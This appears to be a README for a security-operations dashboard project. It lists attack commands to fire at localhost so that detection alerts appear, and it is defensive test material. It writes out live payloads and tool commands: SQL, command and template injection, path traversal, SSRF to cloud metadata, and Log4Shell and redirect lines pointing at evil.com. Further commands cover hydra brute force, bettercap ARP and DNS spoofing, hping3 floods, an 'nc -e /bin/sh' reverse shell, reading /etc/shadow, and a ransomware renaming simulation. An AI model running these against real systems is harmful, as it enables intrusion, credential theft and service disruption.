# NeuralOps — Attack Commands

## How It Works

```
Terminal 1: ./neuralops.sh --all   → starts engine + dashboard
Browser:    http://localhost:8002  → open live dashboard
Terminal 2: curl/nmap/hydra...     → run attacks, watch alerts appear
```

---

## Step 1 — Start NeuralOps

Open **Terminal 1** and run:

```bash
cd AI-Security-Operations-Center
./neuralops.sh --all
```

You'll see engine + dashboard starting. Keep this terminal open.

---

## Step 2 — Open Browser

Go to: **http://localhost:8002**

You're now on the live SOC dashboard. Switch between views using the sidebar:
- **Command Center** — stats, activity log, category chart
- **Alert Feed** — see alerts appear in real time as you run attacks
- **Intelligence** — AI analysis (if API key is configured)
- **Systems** — system status

---

## Step 3 — Run Attacks (Terminal 2)

Open a **second terminal**. All commands below run against `localhost`.
Watch the Alert Feed on the dashboard — alerts pop up in real time.

---

### Web Attacks (curl)

```bash
# SQL Injection
curl "http://localhost:8080/search?id=1'+OR+'1'='1"
# → Alert: SQL Injection

# XSS
curl "http://localhost:8080/search?q=<script>alert(1)</script>"
# → Alert: XSS

# Command Injection
curl "http://localhost:8080/ping?host=127.0.0.1;cat+/etc/passwd"
# → Alert: Command Injection

# Path Traversal
curl "http://localhost:8080/file?name=../../../etc/passwd"
# → Alert: Path Traversal

# SSRF
curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/"
# → Alert: SSRF

# Log4Shell
curl -H "User-Agent: \${jndi:ldap://evil.com:1389/a}" "http://localhost:8080/"
# → Alert: Log4Shell

# SSTI
curl "http://localhost:8080/greet?name={{7*7}}"
# → Alert: SSTI

# Open Redirect
curl "http://localhost:8080/redirect?url=http://evil.com"
# → Alert: Open Redirect

# WebShell Upload
curl -F "file=@shell.php;filename=shell.php" http://localhost:8080/upload
# → Alert: WebShell Upload

# API Key Leak
curl "http://localhost:8080/search?q=sk-proj-ABCDEF1234567890abcdef1234567890abcdef12"
# → Alert: API Key Leak

# File Inclusion
curl "http://localhost:8080/page?file=/etc/passwd"
# → Alert: File Inclusion

# LDAP Injection
curl "http://localhost:8080/search?user=*)(uid=*))(|(uid=*"
# → Alert: LDAP Injection

# Brute Force (5 failed logins)
for i in 1 2 3 4 5; do
  curl -X POST "http://localhost:8080/login" -d "user=admin&pass=wrong$i" -H "User-Agent: hydra/9.3"
done
# → Alert: Brute Force
```

---

### Network Attacks (nmap)

```bash
# Port Scan
nmap -sS -p 22,80,443,3306,8080 localhost
# → Alert: Port Scan Detected

# Aggressive scan
nmap -A -T4 localhost
# → Alert: SYN Scan Pattern

# Full port scan
nmap -sS -p 1-65535 localhost
# → Alert: Port Scan Detected (HIGH)

# Version detection scan
nmap -sV -p 22,80,443 localhost
# → Alert: SYN Scan Pattern

# UDP scan
nmap -sU -p 53,161,500 localhost
# → Alert: Port Scan Detected

# Decoy scan
nmap -D RND:10 -sS localhost
# → Alert: Scanner Tool Correlation

# Fragment scan
nmap -f -sS localhost
# → Alert: SYN Scan Pattern
```

---

### Network Attacks (bettercap)

```bash
sudo bettercap

# Inside bettercap shell:

# Network recon
> net.probe on
> net.show
# → Alert: Recon Tool Fingerprint

# Port scan
> scan 192.168.1.0/24
# → Alert: Port Scan Detected

# ARP spoofing
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
# → Alert: ARP Spoofing / MitM Tooling

# Credential sniffing
> set net.sniff.verbose true
> net.sniff on
# → Alert: MitM Tooling

# DNS spoofing
> set dns.spoof.domains example.com
> dns.spoof on
# → Alert: MitM Tooling
```

---

### Network Attacks (SYN Flood / DDoS)

```bash
# SYN Flood
sudo hping3 -S -p 80 --flood localhost
# → Alert: SYN Flood

# Multi-source DDoS
sudo hping3 -S -p 80 --flood -a 10.0.0.1 localhost &
sudo hping3 -S -p 80 --flood -a 10.0.0.2 localhost &
sudo hping3 -S -p 80 --flood -a 10.0.0.3 localhost &
# → Alert: DDoS

# HTTP flood
ab -n 10000 -c 100 http://localhost:8080/
# → Alert: DDoS
```

---

### Network Attacks (C2 Beacon)

```bash
# Open listener first (in another terminal):
# nc -lvp 4444

# C2 beacon simulation
python3 -c "
import socket, time
for i in range(10):
  s = socket.socket()
  s.connect(('127.0.0.1', 4444))
  s.send(b'GET /beacon HTTP/1.1\r\nHost: evil.com\r\n\r\n')
  s.close()
  time.sleep(1)
"
# → Alert: C2 Beacon
```

---

### System Attacks (SSH Brute Force)

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://localhost -t 4
# → Alert: SSH Brute Force
```

---

### System Attacks (Sudo Abuse)

```bash
sudo -u root whoami
sudo -u root cat /etc/shadow
sudo -u root bash -c 'nc -e /bin/sh 127.0.0.1 4444'
# → Alert: Sudo Abuse
```

---

### Ransomware Simulation

```bash
# Create test files
mkdir -p /tmp/testdocs
echo "sensitive data" > /tmp/testdocs/doc1.txt
echo "confidential" > /tmp/testdocs/doc2.txt

# Simulate ransomware
for f in /tmp/testdocs/*; do
  mv "$f" "$f.locked"
  echo "YOUR FILES ARE ENCRYPTED" > /tmp/RANSOM_NOTE.txt
done
# → Alert: Ransomware Indicators
```

---

### Crypto Miner Simulation

```bash
# DNS lookup of mining pools
nslookup pool.minexmr.com
nslookup xmrpool.eu
# → Alert: Crypto Miner

# Connection to mining pool
nc -zv pool.minexmr.com 4444
```

---

## What You'll See on the Dashboard

As you run each command:
1. Switch to the browser tab at **http://localhost:8002**
2. Click **Alert Feed** in the sidebar
3. New alerts appear with: rule name, severity (color-coded), confidence %, source IP
4. Click any alert → detail panel shows full context: matched pattern, request details, kill chain
5. Click **Intelligence** → AI analysis (if API key configured)

---

## One-Liner Attack Suite (run all at once)

```bash
# Web
curl "http://localhost:8080/search?id=1'+OR+'1'='1"
curl "http://localhost:8080/search?q=<script>alert(1)</script>"
curl "http://localhost:8080/ping?host=127.0.0.1;id"
curl "http://localhost:8080/file?name=../../../etc/passwd"
curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://localhost:8080/redirect?url=http://evil.com"
curl "http://localhost:8080/greet?name={{7*7}}"

# Network
nmap -sS -p 22,80,443,3306 localhost
sudo hping3 -S -p 80 --flood -a 10.0.0.99 localhost

# System
for i in 1 2 3 4 5; do ssh root@localhost 2>/dev/null; done
sudo cat /etc/shadow 2>/dev/null
```
